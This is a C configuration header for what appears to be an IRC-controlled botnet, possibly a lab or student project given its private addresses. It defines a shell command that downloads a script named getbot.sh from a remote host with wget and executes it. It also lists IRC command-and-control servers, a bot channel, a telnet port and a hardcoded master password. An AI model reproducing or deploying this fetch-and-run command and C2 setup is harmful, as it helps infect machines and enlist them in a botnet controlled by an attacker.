#ifndef __CONFIG_H
#define __CONFIG_H

#define DOWNLOAD_BINARIES "rm -rf /tmp/getbot.sh; wget -c http://172.17.0.3/getbot.sh -P /tmp && sh /tmp/getbot.sh"

#define IRC_SERVERS "192.168.0.101:6667|172.17.0.5:6667|127.0.0.1:2222"
#define IRC_CHANNEL "#army_of_furb"
#define IRC_PORT 6667
#define IRC_NICK_LEN 9
#define DEBUG

#define TELNET_PORT 23

// used in IRC handshake process
#define IRC_USER "USER %s localhost localhost :%s"

#define MASTER_PASSWORD "furb1234"

// max buffer for exchanged messages
#define MAX_BUF 1024

#endif